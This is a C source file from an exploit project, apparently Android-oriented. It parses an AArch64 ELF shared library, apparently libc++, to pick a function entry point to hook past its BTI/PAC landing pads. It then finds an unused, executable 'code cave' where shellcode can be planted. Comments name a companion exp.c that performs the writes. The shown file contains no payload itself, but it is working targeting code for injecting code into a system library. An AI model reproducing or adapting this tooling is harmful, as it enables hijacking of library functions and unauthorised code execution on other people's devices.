/* ELF64 LE AArch64 ET_DYN target discovery with a strict three-value result.
 *
 * See elf_parser.h for the contract. Nothing here writes to the file: the
 * caller (exp.c) performs all writes only after a successful preflight.
 */
#include "elf_parser.h"

#include <errno.h>
#include <fcntl.h>
#include <linux/elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define ELF_MAX_PHDRS 4096u
#define ELF_MAX_SHDRS ELF_MAX_CLAIMED
#define ELF_NAME_MAX 200u
#define SYM_NAME_MAX 200u
#define MAX_PREAMBLE_ADVANCE 2

struct parsed {
    Elf64_Phdr *phdrs;
    Elf64_Shdr *shdrs;
    uint16_t phnum;
    uint16_t shnum;
    uint64_t filesize;
    uint64_t exec_off;
    uint64_t exec_filesz;
    uint64_t exec_vaddr;
    int exec_index;
    size_t dynsym_index;
    size_t dynstr_index;
};

static int range_in_file(uint64_t off, uint64_t len, uint64_t filesize) {
    return off <= filesize && len <= filesize - off;
}

static int add_claim(struct elf_layout *l, uint64_t off, uint64_t len) {
    if (len == 0) return 0;
    if (l->claimed_count >= ELF_MAX_CLAIMED) return -1;
    l->claimed[l->claimed_count].off = off;
    l->claimed[l->claimed_count].len = len;
    l->claimed_count++;
    return 0;
}

int placement_range_claimed(const struct elf_layout *l, uint64_t off,
                            uint64_t len) {
    size_t i;
    if (l == NULL || !l->complete || len == 0) return 1;
    if (!range_in_file(off, len, l->filesize)) return 1;
    for (i = 0; i < l->claimed_count; i++) {
        uint64_t a_end = l->claimed[i].off + l->claimed[i].len;
        uint64_t b_end = off + len; /* range_in_file() proved no overflow */
        if (off < a_end && l->claimed[i].off < b_end) return 1;
    }
    return 0;
}

/* Bounded, interrupt-safe positional read. Returns 0 on success. */
static int read_exact(int fd, void *buf, size_t len, uint64_t off) {
    unsigned char *p = (unsigned char *)buf;
    while (len > 0) {
        ssize_t n = pread(fd, p, len, (off_t)off);
        if (n < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (n == 0) return -1; /* short file */
        p += (size_t)n;
        len -= (size_t)n;
        off += (uint64_t)n;
    }
    return 0;
}

/* Read a NUL-terminated name from a bounded string table. A terminator must
 * exist inside the table: never manufacture one from adjacent file bytes. */
static int read_table_name(int fd, uint64_t table_off, uint64_t table_size,
                           uint64_t name_off, char *out, size_t out_size) {
    size_t want, i;
    if (out_size == 0 || name_off >= table_size) return -1;
    want = out_size - 1;
    if ((uint64_t)want > table_size - name_off) want = (size_t)(table_size - name_off);
    if (read_exact(fd, out, want, table_off + name_off) != 0) return -1;
    for (i = 0; i < want; i++) {
        if (out[i] == '\0') return 0;
    }
    return -1; /* unterminated name */
}

static int is_pow2(uint64_t v) {
    return v != 0 && (v & (v - 1)) == 0;
}

int elf_parse_rc_try_next(enum elf_parse_rc rc) {
    return rc == ELF_PARSE_UNSUPPORTED;
}

static enum elf_parse_rc validate_ehdr(const Elf64_Ehdr *h,
                                       uint64_t filesize,
                                       struct elf_layout *layout,
                                       uint64_t *ph_bytes, uint64_t *sh_bytes) {
    uint64_t phoff, shoff;
    if (h->e_ident[EI_MAG0] != ELFMAG0 || h->e_ident[EI_MAG1] != ELFMAG1 ||
        h->e_ident[EI_MAG2] != ELFMAG2 || h->e_ident[EI_MAG3] != ELFMAG3) {
        printf("elf: bad ELF magic\n");
        return ELF_PARSE_INVALID;
    }
    /* Anything other than the exact supported ABI is a hard failure: the
     * exploit must not treat a mismatched file as a fallback target. */
    if (h->e_ident[EI_CLASS] != ELFCLASS64 || h->e_ident[EI_DATA] != ELFDATA2LSB ||
        h->e_type != ET_DYN || h->e_machine != EM_AARCH64) {
        printf("elf: need ELF64 LE AARCH64 ET_DYN (class=%u data=%u type=%u machine=%u)\n",
               h->e_ident[EI_CLASS], h->e_ident[EI_DATA], h->e_type, h->e_machine);
        return ELF_PARSE_INVALID;
    }
    if (h->e_ident[EI_VERSION] != EV_CURRENT || h->e_version != EV_CURRENT ||
        h->e_ehsize != sizeof(Elf64_Ehdr)) {
        printf("elf: invalid ELF version/header size\n");
        return ELF_PARSE_INVALID;
    }
    if (h->e_phentsize != sizeof(Elf64_Phdr) || h->e_shentsize != sizeof(Elf64_Shdr)) {
        printf("elf: invalid phentsize=%u shentsize=%u\n",
               h->e_phentsize, h->e_shentsize);
        return ELF_PARSE_INVALID;
    }
    if (h->e_phnum == 0 || h->e_phnum == PN_XNUM ||
        h->e_shnum == 0 || h->e_shnum == PN_XNUM ||
        h->e_shstrndx == 0xFFFF /* SHN_XINDEX */ ||
        (unsigned)h->e_shstrndx >= (unsigned)h->e_shnum) {
        printf("elf: extended/zero phnum/shnum/shstrndx not supported\n");
        return ELF_PARSE_INVALID;
    }
    if (h->e_phnum > ELF_MAX_PHDRS || h->e_shnum > ELF_MAX_SHDRS) {
        printf("elf: header table count out of bounds\n");
        return ELF_PARSE_INVALID;
    }
    phoff = h->e_phoff;
    shoff = h->e_shoff;
    *ph_bytes = (uint64_t)h->e_phnum * h->e_phentsize;
    *sh_bytes = (uint64_t)h->e_shnum * h->e_shentsize;
    if (!range_in_file(phoff, *ph_bytes, filesize) ||
        !range_in_file(shoff, *sh_bytes, filesize)) {
        printf("elf: phdr/shdr table out of range\n");
        return ELF_PARSE_INVALID;
    }
    if (add_claim(layout, 0, sizeof(Elf64_Ehdr)) != 0 ||
        add_claim(layout, phoff, *ph_bytes) != 0 ||
        add_claim(layout, shoff, *sh_bytes) != 0) {
        printf("elf: too many claimed ranges\n");
        return ELF_PARSE_INVALID;
    }
    return ELF_PARSE_OK;
}

static enum elf_parse_rc load_phdrs(int fd, const Elf64_Ehdr *h,
                                    uint64_t filesize, uint64_t ph_bytes,
                                    struct parsed *p, struct elf_layout *layout) {
    uint16_t i;
    int found_exec = 0;
    p->phdrs = (Elf64_Phdr *)calloc(h->e_phnum, sizeof(Elf64_Phdr));
    if (!p->phdrs) return ELF_PARSE_INVALID;
    if (read_exact(fd, p->phdrs, (size_t)ph_bytes, h->e_phoff) != 0) {
        printf("elf: read program headers failed\n");
        return ELF_PARSE_INVALID;
    }
    for (i = 0; i < h->e_phnum; i++) {
        Elf64_Phdr *ph = &p->phdrs[i];
        if (!range_in_file(ph->p_offset, ph->p_filesz, filesize) ||
            ph->p_filesz > ph->p_memsz || ph->p_vaddr > UINT64_MAX - ph->p_memsz) {
            printf("elf: phdr[%u] out of range\n", i);
            return ELF_PARSE_INVALID;
        }
        if (ph->p_align != 0 && ph->p_align != 1 &&
            (!is_pow2(ph->p_align) || (ph->p_vaddr % ph->p_align) != (ph->p_offset % ph->p_align))) {
            printf("elf: phdr[%u] violates p_align congruence\n", i);
            return ELF_PARSE_INVALID;
        }
        if (ph->p_type == PT_LOAD && (ph->p_flags & PF_X)) {
            if (found_exec) {
                printf("elf: multiple executable PT_LOAD segments\n");
                return ELF_PARSE_INVALID;
            }
            if (ph->p_filesz < sizeof(uint32_t)) {
                printf("elf: executable PT_LOAD too small\n");
                return ELF_PARSE_INVALID;
            }
            found_exec = 1;
            p->exec_index = i;
            p->exec_off = ph->p_offset;
            p->exec_filesz = ph->p_filesz;
            p->exec_vaddr = ph->p_vaddr;
        } else if (ph->p_filesz > 0) {
            /* The executable PT_LOAD is the only legal placement region; all
             * other file-backed segments are metadata for our purposes. */
            if (add_claim(layout, ph->p_offset, ph->p_filesz) != 0) {
                printf("elf: too many claimed ranges\n");
                return ELF_PARSE_INVALID;
            }
        }
    }
    if (!found_exec) {
        printf("elf: no executable PT_LOAD segment\n");
        return ELF_PARSE_INVALID;
    }
    return ELF_PARSE_OK;
}

static int section_type_ok(uint32_t t) {
    switch (t) {
    case SHT_NULL:
    case SHT_PROGBITS:
    case SHT_SYMTAB:
    case SHT_STRTAB:
    case SHT_RELA:
    case SHT_HASH:
    case SHT_DYNAMIC:
    case SHT_NOTE:
    case SHT_NOBITS:
    case SHT_REL:
    case SHT_DYNSYM:
    case 14: /* SHT_INIT_ARRAY  */
    case 15: /* SHT_FINI_ARRAY  */
    case 16: /* SHT_PREINIT_ARRAY */
    case 17: /* SHT_GROUP        */
    case 18: /* SHT_SYMTAB_SHNDX */
    case 0x60000001: /* SHT_ANDROID_REL  */
    case 0x60000002: /* SHT_ANDROID_RELA */
    case 0x70000001: /* SHT_ARM_EXIDX     */
    case 0x70000003: /* SHT_ARM_ATTRIBUTES */
    case 0x6ffffff5: /* SHT_GNU_ATTRIBUTES */
    case 0x6ffffff6: /* SHT_GNU_HASH      */
    case 0x6ffffffd: /* SHT_GNU_verdef    */
    case 0x6ffffffe: /* SHT_GNU_verneed   */
    case 0x6fffffff: /* SHT_GNU_versym    */
    case 0x6fff4c03: /* SHT_LLVM_ADDRSIG  */
        return 1;
    default:
        return 0;
    }
}

static enum elf_parse_rc load_shdrs(int fd, const Elf64_Ehdr *h,
                                    uint64_t filesize, uint64_t sh_bytes,
                                    struct parsed *p, struct elf_layout *layout) {
    uint16_t i;
    Elf64_Shdr *str;
    uint64_t str_off, str_size;
    char str_name[ELF_NAME_MAX];

    p->shdrs = (Elf64_Shdr *)calloc(h->e_shnum, sizeof(Elf64_Shdr));
    if (!p->shdrs) return ELF_PARSE_INVALID;
    if (read_exact(fd, p->shdrs, (size_t)sh_bytes, h->e_shoff) != 0) {
        printf("elf: read section headers failed\n");
        return ELF_PARSE_INVALID;
    }

    str = &p->shdrs[h->e_shstrndx];
    if (str->sh_type != SHT_STRTAB || str->sh_size == 0 ||
        !range_in_file(str->sh_offset, str->sh_size, filesize)) {
        printf("elf: bad .shstrtab\n");
        return ELF_PARSE_INVALID;
    }
    str_off = str->sh_offset;
    str_size = str->sh_size;

    for (i = 0; i < h->e_shnum; i++) {
        Elf64_Shdr *s = &p->shdrs[i];
        if (!section_type_ok(s->sh_type)) {
            printf("elf: shdr[%u] has disallowed type %u\n", i, s->sh_type);
            return ELF_PARSE_INVALID;
        }
        if (i == 0) {
            if (s->sh_type != SHT_NULL || s->sh_offset != 0 || s->sh_size != 0 ||
                s->sh_addralign != 0) {
                printf("elf: shdr[0] is not a clean SHT_NULL\n");
                return ELF_PARSE_INVALID;
            }
        } else if (s->sh_type == SHT_NULL) {
            printf("elf: unexpected SHT_NULL at shdr[%u]\n", i);
            return ELF_PARSE_INVALID;
        }
        if (s->sh_addralign != 0 && (!is_pow2(s->sh_addralign) ||
                                     (s->sh_offset % s->sh_addralign) != 0)) {
            printf("elf: shdr[%u] violates sh_addralign\n", i);
            return ELF_PARSE_INVALID;
        }
        if (s->sh_type == SHT_NOBITS) {
            if (s->sh_offset > filesize) {
                printf("elf: NOBITS shdr[%u] offset out of range\n", i);
                return ELF_PARSE_INVALID;
            }
        } else if (!range_in_file(s->sh_offset, s->sh_size, filesize)) {
            printf("elf: shdr[%u] extent out of range\n", i);
            return ELF_PARSE_INVALID;
        }

        switch (s->sh_type) {
        case SHT_DYNSYM:
            if (s->sh_entsize != sizeof(Elf64_Sym) ||
                s->sh_size % sizeof(Elf64_Sym) != 0 ||
                s->sh_link >= h->e_shnum ||
                p->shdrs[s->sh_link].sh_type != SHT_STRTAB ||
                s->sh_info > s->sh_size / sizeof(Elf64_Sym)) {
                printf("elf: bad DYNSYM shdr[%u] (entsize/link/info)\n", i);
                return ELF_PARSE_INVALID;
            }
            break;
        case SHT_DYNAMIC:
            if (s->sh_entsize != sizeof(Elf64_Dyn) ||
                s->sh_size % sizeof(Elf64_Dyn) != 0 ||
                s->sh_link >= h->e_shnum ||
                p->shdrs[s->sh_link].sh_type != SHT_STRTAB || s->sh_info != 0) {
                printf("elf: bad DYNAMIC shdr[%u] (entsize/link/info)\n", i);
                return ELF_PARSE_INVALID;
            }
            break;
        case SHT_RELA:
            if (s->sh_entsize != sizeof(Elf64_Rela) ||
                s->sh_size % sizeof(Elf64_Rela) != 0 ||
                s->sh_link >= h->e_shnum ||
                (p->shdrs[s->sh_link].sh_type != SHT_DYNSYM &&
                 p->shdrs[s->sh_link].sh_type != SHT_SYMTAB) ||
                s->sh_info >= h->e_shnum) {
                printf("elf: bad RELA shdr[%u] (entsize/link/info)\n", i);
                return ELF_PARSE_INVALID;
            }
            break;
        case SHT_REL:
            if (s->sh_entsize != sizeof(Elf64_Rel) ||
                s->sh_size % sizeof(Elf64_Rel) != 0 ||
                s->sh_link >= h->e_shnum ||
                (p->shdrs[s->sh_link].sh_type != SHT_DYNSYM &&
                 p->shdrs[s->sh_link].sh_type != SHT_SYMTAB) ||
                s->sh_info >= h->e_shnum) {
                printf("elf: bad REL shdr[%u] (entsize/link/info)\n", i);
                return ELF_PARSE_INVALID;
            }
            break;
        default:
            break;
        }

        if (read_table_name(fd, str_off, str_size, s->sh_name, str_name,
                            sizeof(str_name)) != 0) {
            printf("elf: bad sh_name[%u]\n", i);
            return ELF_PARSE_INVALID;
        }
        if (strcmp(str_name, ".dynstr") == 0 || strcmp(str_name, ".dynsym") == 0) {
            int is_str = (strcmp(str_name, ".dynstr") == 0);
            size_t *slot = is_str ? &p->dynstr_index : &p->dynsym_index;
            uint32_t want_type = is_str ? SHT_STRTAB : SHT_DYNSYM;
            if (*slot != 0) {
                printf("elf: duplicate %s section\n", str_name);
                return ELF_PARSE_INVALID;
            }
            /* Validate the named section at its point of identification: a
             * section called .dynsym that is not SHT_DYNSYM is malformed
             * metadata, not a "no usable hook" case. */
            if (s->sh_type != want_type) {
                printf("elf: %s section has wrong type %u\n", str_name, s->sh_type);
                return ELF_PARSE_INVALID;
            }
            *slot = i;
        }
        if (s->sh_type != SHT_NULL && s->sh_type != SHT_NOBITS) {
            if (add_claim(layout, s->sh_offset, s->sh_size) != 0) {
                printf("elf: too many claimed ranges\n");
                return ELF_PARSE_INVALID;
            }
        }
    }
    /* Absent tables mean "no usable hook target" and may be retried with
     * another candidate. Present-but-inconsistent metadata is INVALID. */
    if (p->dynstr_index == 0 || p->dynsym_index == 0) {
        printf("elf: no .dynsym/.dynstr (no usable hook target)\n");
        return ELF_PARSE_UNSUPPORTED;
    }
    if (p->shdrs[p->dynsym_index].sh_type != SHT_DYNSYM ||
        p->shdrs[p->dynstr_index].sh_type != SHT_STRTAB ||
        p->shdrs[p->dynsym_index].sh_link != p->dynstr_index) {
        printf("elf: inconsistent .dynsym/.dynstr\n");
        return ELF_PARSE_INVALID;
    }
    return ELF_PARSE_OK;
}

static enum elf_parse_rc find_symbol(int fd, const struct parsed *p,
                                     const char *symname, uint64_t *hook_target,
                                     uint32_t *first_instruction) {
    Elf64_Shdr *symtab = &p->shdrs[p->dynsym_index];
    Elf64_Shdr *strtab = &p->shdrs[p->dynstr_index];
    size_t count = (size_t)(symtab->sh_size / sizeof(Elf64_Sym));
    size_t i, matches = 0;
    Elf64_Sym match;
    Elf64_Shdr *sec;
    uint64_t delta, hook, sec_end, exec_end;
    char name[SYM_NAME_MAX];

    memset(&match, 0, sizeof(match));
    for (i = 0; i < count; i++) {
        Elf64_Sym sym;
        if (read_exact(fd, &sym, sizeof(sym),
                       symtab->sh_offset + (uint64_t)i * sizeof(Elf64_Sym)) != 0) {
            printf("elf: read dynsym[%zu] failed\n", i);
            return ELF_PARSE_INVALID;
        }
        if (read_table_name(fd, strtab->sh_offset, strtab->sh_size, sym.st_name,
                            name, sizeof(name)) != 0) {
            printf("elf: bad st_name[%zu]\n", i);
            return ELF_PARSE_INVALID;
        }
        if (strcmp(name, symname) != 0) continue;
        if (++matches > 1) {
            printf("elf: ambiguous duplicate symbol %s\n", symname);
            return ELF_PARSE_INVALID; /* never pick one of several */
        }
        match = sym;
    }
    if (matches == 0) {
        printf("elf: symbol %s not found\n", symname);
        return ELF_PARSE_UNSUPPORTED; /* another candidate may define it */
    }

    /* Undefined/absolute/reserved/extension indices are all rejected. */
    if (match.st_shndx == SHN_UNDEF || match.st_shndx >= SHN_LORESERVE ||
        (unsigned)match.st_shndx >= (unsigned)p->shnum) {
        printf("elf: symbol %s has reserved/undefined/out-of-range st_shndx=%u\n",
               symname, match.st_shndx);
        return ELF_PARSE_INVALID;
    }
    sec = &p->shdrs[match.st_shndx];
    sec_end = sec->sh_offset + sec->sh_size;
    exec_end = p->exec_off + p->exec_filesz;
    if (sec->sh_type != SHT_PROGBITS || !(sec->sh_flags & SHF_EXECINSTR) ||
        sec->sh_offset < p->exec_off || sec_end > exec_end ||
        match.st_value < sec->sh_addr ||
        match.st_value - sec->sh_addr >= sec->sh_size ||
        ELF64_ST_TYPE(match.st_info) != STT_FUNC) {
        printf("elf: symbol %s not an executable PROGBITS function inside PT_LOAD\n",
               symname);
        return ELF_PARSE_INVALID;
    }
    if (match.st_value < p->exec_vaddr) {
        printf("elf: symbol %s st_value below executable vaddr\n", symname);
        return ELF_PARSE_INVALID;
    }
    delta = match.st_value - p->exec_vaddr;
    if ((delta & 3) != 0 || delta >= p->exec_filesz ||
        p->exec_filesz - delta < sizeof(uint32_t)) {
        printf("elf: symbol %s delta misaligned/out of range\n", symname);
        return ELF_PARSE_INVALID;
    }
    hook = p->exec_off + delta;
    if (!range_in_file(hook, sizeof(uint32_t), p->filesize)) {
        printf("elf: hook site out of range\n");
        return ELF_PARSE_INVALID;
    }
    if (read_exact(fd, first_instruction, sizeof(*first_instruction), hook) != 0) {
        printf("elf: read hook instruction failed\n");
        return ELF_PARSE_INVALID;
    }

    /* Skip up to two BTI/PAC landing-pad instructions, proving each step stays
     * inside the executable segment. */
    {
        int adv;
        for (adv = 0; adv < MAX_PREAMBLE_ADVANCE; adv++) {
            uint32_t insn = *first_instruction;
            uint64_t next;
            /* HINT-space landing pads, per the Arm ARM and binutils'
             * aarch64 opcode table: PACIASP=#0x19, PACIBSP=#0x1b,
             * BTI=#0x20, BTI c=#0x22, BTI j=#0x24, BTI jc=#0x26.
             * HINT #0x21 (0xd503243f) and #0x23 (0xd503247f) are
             * unallocated and are deliberately not treated as pads. */
            switch (insn) {
            case 0xd503233f: /* PACIASP (HINT #0x19) */
            case 0xd503237f: /* PACIBSP (HINT #0x1b) */
            case 0xd503241f: /* BTI      (HINT #0x20) */
            case 0xd503245f: /* BTI c    (HINT #0x22) */
            case 0xd503249f: /* BTI j    (HINT #0x24) */
            case 0xd50324df: /* BTI jc   (HINT #0x26) */
                break;
            default:
                goto preamble_done;
            }
            next = hook + 4;
            if (next <= hook || next - p->exec_off > p->exec_filesz ||
                p->exec_filesz - (next - p->exec_off) < sizeof(uint32_t) ||
                !range_in_file(next, sizeof(uint32_t), p->filesize)) {
                printf("elf: BTI/PAC advance out of range\n");
                return ELF_PARSE_INVALID;
            }
            hook = next;
            if (read_exact(fd, first_instruction, sizeof(*first_instruction), hook) != 0) {
                printf("elf: read advanced hook instruction failed\n");
                return ELF_PARSE_INVALID;
            }
        }
preamble_done:
        (void)0;
    }
    *hook_target = hook;
    return ELF_PARSE_OK;
}

/* Prefer the slack immediately after the executable PT_LOAD's file-backed
 * data, but only when the whole shellcode still lies on that segment's final
 * page. The global file tail is deliberately NOT used: section headers can
 * end on a different page, outside every executable mapping. If the
 * exec-derived tail is claimed or does not fit, fall back to the first
 * sufficiently long, 4-aligned zero run inside the executable PT_LOAD. */
static enum elf_parse_rc find_code_cave(int fd, const struct parsed *p,
                                        struct elf_layout *layout,
                                        size_t shellcode_size,
                                        uint64_t *out_off) {
    long ps_long = sysconf(_SC_PAGESIZE);
    uint64_t pagesize, exec_last, page_end, tail;
    uint64_t run_start = 0, run_len = 0, max_run = 0;
    unsigned char buf[4096];
    uint64_t done;

    if (shellcode_size == 0 || (shellcode_size & 3) != 0) return ELF_PARSE_INVALID;
    if (ps_long <= 0 || (ps_long & (ps_long - 1)) != 0) {
        printf("elf: invalid system page size %ld\n", ps_long);
        return ELF_PARSE_INVALID;
    }
    pagesize = (uint64_t)ps_long;
    /* load_phdrs() proved exec_filesz >= 4 and exec_off + exec_filesz <=
     * filesize, which came from fstat() and fits in off_t. */
    exec_last = p->exec_off + p->exec_filesz - 1;
    if (exec_last > UINT64_MAX - pagesize ||
        p->exec_filesz > UINT64_MAX - 3) return ELF_PARSE_INVALID;
    page_end = ((exec_last / pagesize) + 1) * pagesize;
    tail = (p->exec_off + p->exec_filesz + 3) & ~(uint64_t)3;
    if (tail <= page_end && (uint64_t)shellcode_size <= page_end - tail &&
        range_in_file(tail, (uint64_t)shellcode_size, p->filesize) &&
        placement_range_claimed(layout, tail, (uint64_t)shellcode_size) == 0) {
        printf("elf: using unclaimed exec-segment tail at 0x%llx\n",
               (unsigned long long)tail);
        *out_off = tail;
        return ELF_PARSE_OK;
    }
    printf("elf: exec-segment tail at 0x%llx unusable; searching executable zero run\n",
           (unsigned long long)tail);

    for (done = 0; done < p->exec_filesz; done += sizeof(buf)) {
        uint64_t remain = p->exec_filesz - done;
        size_t chunk = remain > sizeof(buf) ? sizeof(buf) : (size_t)remain;
        size_t i;
        if (read_exact(fd, buf, chunk, p->exec_off + done) != 0) {
            printf("elf: read executable segment failed\n");
            return ELF_PARSE_INVALID;
        }
        for (i = 0; i < chunk; i++) {
            uint64_t here = p->exec_off + done + (uint64_t)i;
            if (buf[i] == 0) {
                if (run_len == 0) {
                    /* Only 4-aligned zero bytes may start a placement. */
                    if ((here & 3) != 0) continue;
                    run_start = here;
                }
                if (++run_len > max_run) max_run = run_len;
                /* A claimed candidate can be skipped by advancing within the
                 * same zero run; every candidate remains 4-aligned. */
                while (run_len >= (uint64_t)shellcode_size &&
                       placement_range_claimed(layout, run_start,
                                               (uint64_t)shellcode_size)) {
                    run_start += 4;
                    run_len -= 4;
                }
                if (run_len >= (uint64_t)shellcode_size) {
                    printf("elf: using unclaimed code cave at 0x%llx\n",
                           (unsigned long long)run_start);
                    *out_off = run_start;
                    return ELF_PARSE_OK;
                }
            } else {
                run_len = 0;
            }
        }
    }
    printf("elf: no unclaimed %zu-byte placement (largest zero run %llu) - DEVICE NOT SUPPORTED\n",
           shellcode_size, (unsigned long long)max_run);
    return ELF_PARSE_UNSUPPORTED;
}

enum elf_parse_rc find_hook_target_layout(const char *libcxx, const char *symname,
                                          struct elf_layout *layout,
                                          size_t shellcode_size) {
    enum elf_parse_rc rc;
    Elf64_Ehdr eh;
    struct parsed p;
    uint64_t ph_bytes = 0, sh_bytes = 0;
    int fd;

    if (layout == NULL) return ELF_PARSE_INVALID;
    memset(layout, 0, sizeof(*layout));
    memset(&p, 0, sizeof(p));
    if (libcxx == NULL || symname == NULL) return ELF_PARSE_INVALID;

    fd = open(libcxx, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        printf("elf: open %s failed: %s\n", libcxx, strerror(errno));
        return ELF_PARSE_INVALID;
    }
    {
        struct stat st;
        if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || st.st_size <= 0) {
            printf("elf: fstat %s failed or not a regular file\n", libcxx);
            rc = ELF_PARSE_INVALID;
            goto out;
        }
        p.filesize = (uint64_t)st.st_size;
    }
    if (read_exact(fd, &eh, sizeof(eh), 0) != 0) {
        printf("elf: read ELF header failed\n");
        rc = ELF_PARSE_INVALID;
        goto out;
    }
    rc = validate_ehdr(&eh, p.filesize, layout, &ph_bytes, &sh_bytes);
    if (rc != ELF_PARSE_OK) goto out;
    p.phnum = eh.e_phnum;
    p.shnum = eh.e_shnum;
    layout->filesize = p.filesize;
    layout->exec_filesz = 0;

    rc = load_phdrs(fd, &eh, p.filesize, ph_bytes, &p, layout);
    if (rc != ELF_PARSE_OK) goto out;
    rc = load_shdrs(fd, &eh, p.filesize, sh_bytes, &p, layout);
    if (rc != ELF_PARSE_OK) goto out;

    layout->exec_off = p.exec_off;
    layout->exec_filesz = p.exec_filesz;
    layout->exec_vaddr = p.exec_vaddr;

    rc = find_symbol(fd, &p, symname, &layout->hook_target,
                     &layout->first_instruction);
    if (rc != ELF_PARSE_OK) goto out;
    /* Claims are complete here: enable the placement proof before choosing. */
    layout->complete = 1;
    rc = find_code_cave(fd, &p, layout, shellcode_size, &layout->payload_target);
    if (rc != ELF_PARSE_OK) goto out;

    rc = ELF_PARSE_OK;

out:
    free(p.phdrs);
    free(p.shdrs);
    close(fd);
    if (rc != ELF_PARSE_OK) {
        memset(layout, 0, sizeof(*layout));
    }
    return rc;
}

enum elf_parse_rc find_hook_target(const char *libcxx, const char *symname,
                                   uint64_t *hook_target, uint64_t *payload_target,
                                   uint32_t *first_instruction,
                                   size_t shellcode_size) {
    struct elf_layout layout;
    enum elf_parse_rc rc;

    if (hook_target) *hook_target = 0;
    if (payload_target) *payload_target = 0;
    if (first_instruction) *first_instruction = 0;
    rc = find_hook_target_layout(libcxx, symname, &layout, shellcode_size);
    if (rc == ELF_PARSE_OK) {
        if (hook_target) *hook_target = layout.hook_target;
        if (payload_target) *payload_target = layout.payload_target;
        if (first_instruction) *first_instruction = layout.first_instruction;
    }
    return rc;
}
